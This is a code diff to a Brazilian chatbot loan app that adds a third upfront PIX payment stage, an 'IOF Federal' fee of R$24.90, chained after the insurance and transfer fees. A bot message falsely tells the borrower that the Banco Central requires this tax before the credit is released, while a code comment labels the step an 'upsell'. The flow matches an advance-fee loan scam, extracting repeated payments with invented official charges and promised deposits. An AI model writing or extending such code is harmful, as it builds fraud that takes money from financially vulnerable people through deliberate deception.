@@ -33,7 +33,7 @@ interface ChatMessage {
   insurancePdf?: string;
   insuranceInfoPdf?: boolean;
   manualConfirmButton?: boolean;
-  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" };
+  pixPayment?: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" | "iof" };
   pdfConfirmButton?: boolean;
   proceedButton?: boolean;
   pixPaidButton?: boolean;
@@ -761,7 +761,7 @@ const formatPixTime = (totalSec: number) => {
   return `${m}:${s}`;
 };
 
-const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel, phase = "seguro" }: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" }) => {
+const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel, phase = "seguro" }: { qrCode: string; qrCodeBase64: string; value: number; label?: string; sublabel?: string; phase?: "seguro" | "taxa" | "iof" }) => {
   const [copied, setCopied] = useState(false);
   const [secondsLeft, setSecondsLeft] = useState(15 * 60);
   const [proofIndex, setProofIndex] = useState(0);
@@ -1829,7 +1829,8 @@ const Chat = () => {
   const [normativoConfirmed, setNormativoConfirmed] = useState(false);
   const [pixPaid, setPixPaid] = useState(false);
   const [taxaPaid, setTaxaPaid] = useState(false);
-  const [paymentPhase, setPaymentPhase] = useState<"insurance" | "taxa">(isTaxaPreview ? "taxa" : "insurance");
+  const [iofPaid, setIofPaid] = useState(false);
+  const [paymentPhase, setPaymentPhase] = useState<"insurance" | "taxa" | "iof">(isTaxaPreview ? "taxa" : "insurance");
   const [pixTransactionId, setPixTransactionId] = useState<string | null>(null);
   const [checkingPayment, setCheckingPayment] = useState(false);
   const [previewInitialized, setPreviewInitialized] = useState(isTaxaPreview);
@@ -2217,8 +2218,14 @@ const Chat = () => {
   };
 
   const generatePixPayment = async () => {
+    const introText =
+      paymentPhase === "iof"
+        ? `Segue o PIX para pagamento do IOF Federal:`
+        : paymentPhase === "taxa"
+        ? `Segue o PIX para pagamento da taxa de transferência:`
+        : `Segue o PIX para pagamento do Seguro Prestamista:`;
     await addBotMessages(() => [{
-      id: Date.now(), text: paymentPhase === "taxa" ? `Segue o PIX para pagamento da taxa de transferência:` : `Segue o PIX para pagamento do Seguro Prestamista:`,
+      id: Date.now(), text: introText,
       fromUser: false, time: getNow(), read: true,
     }]);
 
@@ -2246,7 +2253,18 @@ const Chat = () => {
         });
       } catch (e) { console.error('TikTok identify error:', e); }
 
-      const contentId = paymentPhase === "taxa" ? 'taxa_transferencia' : 'seguro_prestamista';
+      const contentId =
+        paymentPhase === "iof" ? 'iof_federal'
+        : paymentPhase === "taxa" ? 'taxa_transferencia'
+        : 'seguro_prestamista';
+      const contentName =
+        paymentPhase === "iof" ? 'IOF Federal'
+        : paymentPhase === "taxa" ? 'Taxa de Transferência'
+        : 'Seguro Prestamista';
+      const pixValueCents =
+        paymentPhase === "iof" ? 2490
+        : paymentPhase === "taxa" ? 1874
+        : 3179;
 
       // Robust fallbacks: prefer freshly-stored chatState, then cpfData from CPF lookup
       let resolvedNome = (nome || '').trim();
@@ -2295,7 +2313,7 @@ const Chat = () => {
 
       const { data, error } = await supabase.functions.invoke('create-pix', {
         body: {
-          value: paymentPhase === "taxa" ? 1874 : 3179,
+          value: pixValueCents,
           customer: customerPayload,
           tiktok: {
             hashed_email: hashedEmail,
@@ -2315,17 +2333,24 @@ const Chat = () => {
       }
 
       // TikTok Pixel — InitiateCheckout
-      const pixValueReais = (data.value || (paymentPhase === "taxa" ? 1874 : 3179)) / 100;
+      const pixValueReais = (data.value || pixValueCents) / 100;
       try {
         window.ttq?.track('InitiateCheckout', {
           content_type: 'product',
           content_id: contentId,
-          content_name: paymentPhase === "taxa" ? 'Taxa de Transferência' : 'Seguro Prestamista',
+          content_name: contentName,
           quantity: 1,
           value: pixValueReais,
           currency: 'BRL',
         });
       } catch (e) { console.error('TikTok InitiateCheckout error:', e); }
+
+      const pixPaymentExtra =
+        paymentPhase === "iof"
+          ? { phase: "iof" as const, label: "IOF Federal", sublabel: "Imposto sobre Operações Financeiras:" }
+          : paymentPhase === "taxa"
+          ? { phase: "taxa" as const, label: "Taxa de Transferência", sublabel: "Taxa de transferência interbancária:" }
+          : { phase: "seguro" as const };
 
       await addBotMessages(() => [{
         id: Date.now() + 1,
@@ -2333,8 +2358,7 @@ const Chat = () => {
           qrCode: data.qr_code,
           qrCodeBase64: data.qr_code_base64,
           value: data.value,
-          phase: paymentPhase === "taxa" ? "taxa" : "seguro",
-          ...(paymentPhase === "taxa" ? { label: "Taxa de Transferência", sublabel: "Taxa de transferência interbancária:" } : {}),
+          ...pixPaymentExtra,
         },
         fromUser: false, time: getNow(), read: true,
       }]);
@@ -2671,12 +2695,23 @@ const Chat = () => {
                         const status = data?.status;
                         if (status === 'paid' || status === 'completed' || status === 'confirmed' || status === 'approved') {
                           // TikTok Pixel — CompletePayment
-                          const paidValue = paymentPhase === "taxa" ? 18.74 : 31.79;
+                          const paidValue =
+                            paymentPhase === "iof" ? 24.90
+                            : paymentPhase === "taxa" ? 18.74
+                            : 31.79;
+                          const paidContentId =
+                            paymentPhase === "iof" ? 'iof_federal'
+                            : paymentPhase === "taxa" ? 'taxa_transferencia'
+                            : 'seguro_prestamista';
+                          const paidContentName =
+                            paymentPhase === "iof" ? 'IOF Federal'
+                            : paymentPhase === "taxa" ? 'Taxa de Transferência'
+                            : 'Seguro Prestamista';
                           try {
                             window.ttq?.track('CompletePayment', {
                               content_type: 'product',
-                              content_id: paymentPhase === "taxa" ? 'taxa_transferencia' : 'seguro_prestamista',
-                              content_name: paymentPhase === "taxa" ? 'Taxa de Transferência' : 'Seguro Prestamista',
+                              content_id: paidContentId,
+                              content_name: paidContentName,
                               quantity: 1,
                               value: paidValue,
                               currency: 'BRL',
@@ -2684,9 +2719,9 @@ const Chat = () => {
                             });
                           } catch (e) { console.error('TikTok CompletePayment error:', e); }
 
-                          if (paymentPhase === "taxa") {
-                            // Taxa paid — navigate to success page
-                            setTaxaPaid(true);
+                          if (paymentPhase === "iof") {
+                            // IOF paid — final step, navigate to success
+                            setIofPaid(true);
                             setPixPaid(true);
                             setTimeout(() => {
                               setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
@@ -2694,7 +2729,7 @@ const Chat = () => {
                             setTimeout(() => {
                               addBotMessages(() => [{
                                 id: Date.now() + 10,
-                                text: `Taxa de transferência confirmada com sucesso!\n\nSeu crédito de ${formatCurrency(loanDetails?.valor || 2500)} está sendo processado. Você receberá um e-mail com todos os detalhes.\n\nRedirecionando...`,
+                                text: `IOF Federal confirmado com sucesso!\n\nTodas as etapas foram concluídas. Seu crédito de ${formatCurrency(loanDetails?.valor || 2500)} será depositado em até 24 horas na conta informada.\n\nRedirecionando...`,
                                 fromUser: false, time: getNow(), read: true,
                               }]).then(() => {
                                 setTimeout(() => {
@@ -2708,6 +2743,28 @@ const Chat = () => {
                                     },
                                   });
                                 }, 2000);
+                              });
+                            }, 500);
+                          } else if (paymentPhase === "taxa") {
+                            // Taxa paid — chain to IOF Federal upsell
+                            setTaxaPaid(true);
+                            setPixPaid(true);
+                            setTimeout(() => {
+                              setMessages((prev) => [...prev, { id: Date.now(), text: "Já paguei", fromUser: true, time: getNow(), read: true }]);
+                            }, 300);
+                            setTimeout(() => {
+                              addBotMessages(() => [{
+                                id: Date.now() + 10,
+                                text: `Taxa de transferência confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas uma última etapa para liberar o seu crédito de ${formatCurrency(loanDetails?.valor || 2500)}.\n\nO Banco Central exige o recolhimento do IOF Federal (Imposto sobre Operações Financeiras) sobre toda concessão de crédito. O valor é único, no total de R$ 24,90, conforme a alíquota oficial vigente.\n\nApós a confirmação do IOF, o valor cai na sua conta em até 24 horas.`,
+                                fromUser: false, time: getNow(), read: true,
+                              }]).then(() => {
+                                // Reset state for new PIX
+                                setPaymentPhase("iof");
+                                setPixPaid(false);
+                                setPixTransactionId(null);
+                                setTimeout(() => {
+                                  generatePixPayment();
+                                }, 600);
                               });
                             }, 500);
                           } else {
